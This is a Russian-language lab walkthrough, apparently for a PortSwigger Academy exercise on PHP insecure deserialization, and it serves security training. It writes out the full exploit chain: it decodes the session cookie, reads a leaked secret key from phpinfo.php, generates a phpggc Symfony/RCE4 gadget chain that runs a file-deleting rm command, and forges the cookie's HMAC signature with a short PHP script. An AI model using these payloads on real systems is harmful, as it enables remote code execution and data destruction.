Залогинимся под `wiener:peter`

в `Proxy` -> `HTTP history` найдем запрос после аутентифицкации, и посмотрим на куку, что нам присвоили

```
GET /my-account?id=wiener
Cookie: session=%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0emV0M25vOTV4c2M3Yzd1b3Z4aDVuem1yNDZ6cHRmbiI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22f7b750f2393650c6ee5f2da5034a3d2341879e67%22%7D
```


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/pics%20for%20walkthrough/1.png)

В декодированном виде она выглядит как 
```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0emV0M25vOTV4c2M3Yzd1b3Z4aDVuem1yNDZ6cHRmbiI7fQ==","sig_hmac_sha1":"f7b750f2393650c6ee5f2da5034a3d2341879e67"}
```
и отправим данный запрос в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/pics%20for%20walkthrough/2.png)

Более того, обратим внимание на сочетание 
```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0emV0M25vOTV4c2M3Yzd1b3Z4aDVuem1yNDZ6cHRmbiI7fQ=="
```
где значение токена может быть декодировано как 
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"tzet3no95xsc7c7uovxh5nzmr46zptfn";}
```
Изменим значение на `carlos` и декодируем обратно в base64'

получив 
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0emV0M25vOTV4c2M3Yzd1b3Z4aDVuem1yNDZ6cHRmbiI7fQ==
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/pics%20for%20walkthrough/3.png)

вернемся в `Repeater` и подставим получившийся токен в куку 

в поле `token` и нажмем `apply changes` и отправим данный запрос 
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/pics%20for%20walkthrough/4.png)

После отправки запроса увидим 500 ошибку сервера, который выдает нам версию php 4.3.6 и с сообщением, что цифровая подпись не подоходит

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/pics%20for%20walkthrough/5.png)

Далее обратимся к `phpinfo.php` чтобы узнать версиб php и секреты

```
https://0a4700b8044e86ef8385d8940037007a.web-security-academy.net/cgi-bin/phpinfo.php
```
и увидим 
```
SECRET_KEY	i5vqbmo0v7ctaod6mmfswu1c6kg83klr
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/pics%20for%20walkthrough/6.png)

Далее необходимо воспользвоаться тулзой `phpgcc`

Для этого скачаем ее 
```
git clone https://github.com/ambionics/phpggc.git

cd phpggc 

./phpgcc -l
```
узнаем полный список допустимых методов


Так как у нас симфони версион 4.3.6 нам подходит пак 
```
Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7                             RCE: Command              __destruct      *   
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/pics%20for%20walkthrough/7.png)

Сконфигурируем куку
```
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```
на что получим
```
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```


Сконфигурируем скрипт, вставив туда нашу куку и secret key, что мы обнаружили ранее
```
└─$ vim scriptSignSha1.php 
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "i5vqbmo0v7ctaod6mmfswu1c6kg83klr";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/pics%20for%20walkthrough/8.png)

и с помощью php запустим скрипт

и получим куку
```
php scriptSignSha1.php
```
```
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%220ae41f6c54976698be3478f701006eff3a7486a5%22%7D
```

отправим запрос с данной куки и получим сообщение об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/pics%20for%20walkthrough/9.png)
